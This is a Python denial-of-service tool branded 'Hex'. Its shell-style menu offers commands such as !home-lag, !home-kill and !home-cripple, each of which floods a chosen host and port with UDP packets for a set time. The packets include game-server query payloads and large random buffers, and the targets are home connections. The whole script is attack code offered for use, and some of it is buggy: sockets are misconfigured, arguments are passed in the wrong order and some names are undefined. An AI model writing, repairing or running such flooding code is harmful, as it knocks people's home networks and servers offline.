#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import time
import socket
import random
import threading
import getpass
import os
import urllib
import json


nicknm = "𝓱𝓮𝔁"

methods = """
!Home-lagger, !home-lag, !home-stress, !home-kill, !home-premium, !home-cripple
"""

banner = """
\033[32m𝓥𝓮𝓻𝓼𝓲𝓸𝓷 \033[4mHome Holder\033[m \033[92m- \033[35m🟣 \033[93m𝓘𝓷𝓼𝓽𝓪𝓰𝓻𝓪𝓶: \033[31m🔥 \033[85m \033[4m𝓱3𝔁.𝓷𝓮𝓽.𝓹𝔂 \033[m \033[35m⚫
\033[32m                                   ╦\033[95m ╦ \033[32m╔\033[32m═╗ \033[92m═╗\033[35m ╦
\033[32m                                   ╠\033[95m═╣ \033[32m║\033[32m╣  \033[92m╔╩\033[35m╦╝
\033[32m                                   ╩\033[95m ╩ \033[32m╚═\033[32m╝ \033[92m╩ \033[35m╚═\033[95mXI
\033[32m                                   𝓗𝓮\033[95m𝔁 𝓝\033[32m𝓮𝓽\033[32m𝔀\033[92m𝓸\033[35m𝓻\033[95m𝓴
                               
\033[32m                       ╔═════\033[95m════════\033[32m═══════\033[92m═════\033[35m═══\033[95m═════════\033[92m════╗   
\033[32m                       ║\033[95mWelcome To \033[32mThe Star\033[92mting S\033[35mcr\033[95meen Of H E X \033[32m ║   
\033[32m                       ║\033[95mOffically R\033[32man By Th\033[92me Foun\033[35mder\033[95r @h3x.net.py\033[32m ║
\033[32m                       ╚═════\033[95m════════\033[32m════════\033[92m═════\033[35m═══\033[95m════════\033[32m════╝

\033[32m                       ╔════════\033[95m════════\033[32m════════\033[92m═════\033[35m═══\033[95m════\033[32m════╗
\033[32m                       ║\033[95m-\033[95m -Conne\033[32mction Ha\033[92ms Bee\033[35mn \033[95m(ESTA\033[32mBILISHED)- -\033[32m║
\033[32m                       ╚════════\033[95m════════\033[32m════════\033[92m═════\033[35m══\033[95m═════\033[32m════╝
"""

cookie = open(".hex_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
ovh = True
atks = 0

def ovhsender(host, dport, timer, punch):
    global iaid
    global ovh
    global aid
    global tattacks

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    while time.time() < timeout and ovh and attack:
        sock.sendto(punch, (host, int(dport)))
    iaid -= 1
    aid -= 1

def randsender(host, timer, port, punch):
    global iaid
    global aid
    global tattacks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

    iaid += 1
    aid += 1
    tattacks += 1
    running += 1
    while time.time() < timeout and ldap and attack:
        sock.sendto(punch, (host, int(port)))
    running -= 1
    iaid -= 1
    aid -= 1


def stdsender(host, port, timer, payload):
    global atks
    global running

    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
        sock.sendto(payload, (host, int(port)))
    atks -= 1
    running -= 1

def main():
    global fsubs
    global tpings
    global pscans
    global liips
    global tattacks
    global uaid
    global running
    global atk
    global ldap
    global said
    global iaid
    global haid
    global aid
    global attack
    global dp

    while True:
        bots = (random.randint(32500,41500))
        sys.stdout.write("\x1b]2;H E X. | Devices [{}] | Spoofed Servers [20] | VIP: [ACTIVE] | Clients [0[\x07".format (bots))
        sin = input("\033[32m[\033[35m{}\033[92m@Hex]\033[95m$ \033[96m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
        if sinput == "clear":
            os.system ("clear")
            print (banner)
            main()
        if sinput == "cls":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "methods":
            os.system ("clear")
            print (methods)
            main()
        elif sinput == "?":
            os.system ("clear")
            print (banner)
            main()
        elif sinput == "layer4":
            os.system ("clear")
            print (layer4)
            main()
        elif sinput == "method":
            os.system ("clear")
            print (methods)
            main()
        elif sinput == "methods":
            os.system ("clear")
            print (methods)
            main()
        elif sinput == "premium":
            os.system ("clear")
            print (premium)
            main()
        elif sinput == "homes":
            os.system ("clear")
            print (home)
            main()
        elif sinput == "raw":
            os.system ("clear")
            print (raw)
            main()
        elif sinput == "":
            main()
        elif sinput == "exit":
            os.system ("clear")
            exit()
        elif sinput == "home":
            os.system ("clear")
            print (homes)
            main()
        elif sinput == "!home-lagger":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
                    threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "!home-lag":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "!home-stress":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "!home-kill":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "!home-premium":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=stdsender, args=(host, timer, port, punch)).start()
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "!home-cripple":
            try:
                if running >= 50:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 65500
                    punch = random._urandom(int(pack))
                    threading.Thread(target=stdsender, args=(host, timer, port, punch)).start()
                    print("\033[97mYour Attack Has Been Launched!")
            except ValueError:
                main()
            except socket.gaierror:
                main()
        elif sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
        elif sinput == "stop":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True

        else:
            main()


try:
    clear = "clear"
    os.system(clear)
    print(banner)
    main()
except KeyboardInterrupt:
    exit()
